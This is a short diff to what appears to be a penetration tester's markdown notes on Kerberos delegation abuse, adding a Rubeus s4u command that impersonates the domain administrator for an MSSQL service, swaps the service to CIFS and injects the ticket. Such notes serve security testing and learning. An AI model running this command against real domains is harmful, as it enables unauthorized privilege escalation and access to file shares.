@@ -787,6 +787,9 @@ Rubeus.exe s4u /ticket:adminsrv$_LOCALxxx.kirbi /impersonateuser:Administrator /
 
 **NOTE:** You then save both to disk or output-String, and import the one you want to impersonate i.e., LDAP
 
+```
+.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
+```
 * * * 
 
 Inject PTT:
